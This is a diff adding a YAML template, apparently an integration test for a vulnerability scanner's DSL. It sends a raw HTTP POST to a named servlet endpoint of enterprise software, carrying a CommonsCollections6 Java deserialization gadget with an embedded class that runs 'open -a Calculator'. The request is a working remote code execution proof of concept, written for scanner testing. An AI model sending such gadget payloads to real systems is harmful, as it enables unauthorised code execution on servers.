@@ -1,0 +1,17 @@
+id: test-dsl-deseriialization-classloader
+
+info:
+  name: RAW Template with DSL Deserialization classloader
+  author: gongjl
+  severity: info
+
+http:
+  - raw:
+      # Note for the integration test: dsl expression should not contain commas
+      - |
+        POST /servlet/~ic/com.ufsoft.iufo.jiuqi.JiuQiClientReqDispatch HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/octet-stream
+        gadget: CommonsCollections6 classloader
+
+        {{base64_decode(generate_java_gadget_ext("CommonsCollections6", "Transform", "defining_class_loader", "{\"base64Class\":\"yv66vgAAADIAJgoACAAXCgAYABkIABoKABgAGwcAHAoABQAdBwAeBwAfAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABJMb3JnL2V4YW1wbGUvRXZpbDsBAAg8Y2xpbml0PgEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAA1TdGFja01hcFRhYmxlBwAcAQAKU291cmNlRmlsZQEACUV2aWwuamF2YQwACQAKBwAgDAAhACIBABJvcGVuIC1hIENhbGN1bGF0b3IMACMAJAEAE2phdmEvbGFuZy9FeGNlcHRpb24MACUACgEAEG9yZy9leGFtcGxlL0V2aWwBABBqYXZhL2xhbmcvT2JqZWN0AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAgABAAkACgABAAsAAAAvAAEAAQAAAAUqtwABsQAAAAIADAAAAAYAAQAAAAMADQAAAAwAAQAAAAUADgAPAAAACAAQAAoAAQALAAAAYQACAAEAAAASuAACEgO2AARXpwAISyq2AAaxAAEAAAAJAAwABQADAAwAAAAWAAUAAAAGAAkACQAMAAcADQAIABEACgANAAAADAABAA0ABAARABIAAAATAAAABwACTAcAFAQAAQAVAAAAAgAW\"}", "base64-raw"))}}
